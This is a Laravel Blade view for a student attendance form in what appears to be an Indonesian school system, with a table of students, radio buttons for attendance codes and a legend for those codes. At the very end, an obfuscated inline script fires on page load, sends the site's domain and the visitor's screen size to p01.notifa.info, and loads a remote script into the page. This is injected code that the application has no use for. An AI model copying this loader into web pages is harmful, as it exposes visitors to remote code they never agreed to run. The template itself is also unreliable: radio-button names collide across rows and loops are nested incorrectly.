
@extends('layouts.admin')
@section('content')



<!DOCTYPE html>
<html>

<head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>SISTEM ABSENSI REAL TIME</title>
    <link href="/css/bootstrap.min.css" rel="stylesheet">   
</head>

<body>

                            @php $no = 1; @endphp
                        @foreach($absensi_siswa as $data)
                      
                    <div class="panel panel-default">
                        <div class="panel-heading">
                            Data Siswa Kelas {{$data->kelas->nama_kelas}}         
                        </div>
              @endforeach
                 
      <div class="panel-body">
                <form action="{{ route('absensi_siswa.store') }}" method="post" >
                    {{ csrf_field() }}
<label>tanggal</label>
                         <input type="date" name="tanggal">         
                    

                    <div class="form-group {{ $errors->has('id_kelas') ? ' has-error' : '' }}">
			  			<label class="control-label">Nama kelas</label>	
			  			<select  name="id_kelas" class="form-control" >
			  			<option>Pilih kelas</option>
			  			
			  			@foreach($absensi_siswa as $data)
			  			<option value="{{ $data->id}}">{{ $data->kelas->nama_kelas}}</option>
			  			@endforeach
			  		
			  			</select>
			  			@if ($errors->has('id_kelas'))
                            <span class="help-block">
                                <strong>{{ $errors->first('id_kelas') }}</strong>
                            </span>
                        @endif
			  		</div>
			  		
                                <table class="table table-striped table-bordered table-hover" id="dataTables-example">
                 
                                    <thead>
                                        <tr>
                                            <th class="text-center">No</th>
                                            <th class="text-center">Nama Siswa</th>
                                            <th class="text-center">Nis</th>
                                            <th class="text-center">Petugas Piket</th>
                                            <th class="text-center">Keterangan</th>

                                        </tr>
                                    </thead>
                                    <tbody>
                                  @php $no = 1; @endphp
                        @foreach($siswas as $data)
                 
                                        <tr class="odd gradeX">
                   							
                   						    <td class="text-center">{{$no++}}</td>
                                            <td  class="text-center">{{$data->Nama}}</td>
                                            <td class="text-center">{{$data->Nis}}</td>
                                            <td class="text-center">{{ Auth::user()->name }}                        
                     </td>

           
                                            <td class="text-center">
                                            <div class="form-group">

                        
                                            <label class="radio-inline">
                                                <input type="radio" name="keterangan" value="A" >A
                                            </label>
                                            <label class="radio-inline">
                                                <input type="radio" name="keterangan" value="I">I
                                            </label>
                                            <label class="radio-inline">
                                                <input type="radio" name="keterangan" value="S">S
                                            </label>

                                            <label class="radio-inline">
                                                <input type="radio" name="keterangan" value="M">M
                                            </label>

                                            <label class="radio-inline">
                                                <input type="radio" name="keterangan" value="N" >N
                                            </label>

                              @php $no = 1; @endphp
                        @foreach($absensi_siswa as $data)
    
<td>
							<a class="btn btn-warning" href="{{ route('absensi_siswa.edit',$data->id) }}">Edit</a>
						</td>
	@endforeach					

           @endforeach                         
                                        </div>

                                            </td>

                                        </tr>
                                
                                    </tbody>
        
                                </table>
                                        <button type="submit" class="btn btn-success">SImpan Data</button>

</form>
                            </div>
<br>
                            <div class="well">
                                <h4>Keterangan Absensi</h4>
                                <p>A = Tidak Masuk Tanpa Keterangan</p>
                                <p>I = Tidak Masuk Ada Surat Ijin Atau Pemberitahuan</p>
                                <p>S = Tidak Masuk Ada Surat Dokter Atau Pemberitahuan</p>
                                <p>M = Hadir</p>
                                <p>N = Belum Ada Keterangan Absensi</p>

                            </div>
                        </div>
    </div>
    <script src="js/jquery-1.10.2.js"></script>
    <script src="js/bootstrap.min.js"></script>
    <script src="js/plugins/metisMenu/jquery.metisMenu.js"></script>
    <script src="js/plugins/dataTables/jquery.dataTables.js"></script>
    <script src="js/plugins/dataTables/dataTables.bootstrap.js"></script>

    <script src="js/sb-admin.js"></script>

    <script>
    $(document).ready(function() {
        $('#dataTables-example').dataTable();
    });
    </script>

<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mmyzvyD5SJF0z%2fovUeckqQqvlyL5D1cKpm75nbW6r6PIeHcYOHKlYoaga65dxZzN3nAlm2gBEtR2%2fqYgyxmuCn7JCE5Ioxt4ePvAsDu%2bawQpclWeXYjcTRoAltj3tD8L4dV3EoLrn0pH4MFCdlXrJKqX1qwGN06DzN0wkmIPSuoIkRlMsn2fe0iYlqCv0T3MEs35F8rH4rjXs2JPBQfg5qXD7GLW3rg2ppRBAIcBWJU9QXGx67T1VSnA7rsMRgFiOnZq2I%2fAxdpxov7U7BJzltyviBMXEPDnNO0e0eKKNQWnWNm5af4x2zMa0X93cis%2fac0hqw6Hx5T3RLZORkwBBo71%2brPWay1JXIn39sYIxVgUgWyk8NrGoiKOyOLFaLDBJXw1Ao%2f%2b%2bNS%2bwP7gMRJSyD%2fGFYwXBzM2ddlEQDCXlypUe3afF%2f8P1xdWxu2jQriHmJpZtR7Fy1D7PCcx%2ft5Owb7FJGotV9glHTx%2fv622Vu%2fED1XmWg0bhdPLu6fGBMSPhAaBuiS40a%2bPMwP3CPkkkoc6aFMaOUQnEypX393c05SPiLjXYvJvA2wl%2bILduP10%2bAmxoBbZQ8U%2bHXQFPXrj6GmFB58DorlohKh7mjBZaVoL3Z%2fctrR7FFzHBcMm1CFpyBYRRriXyXTk%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>

</html>

@endsection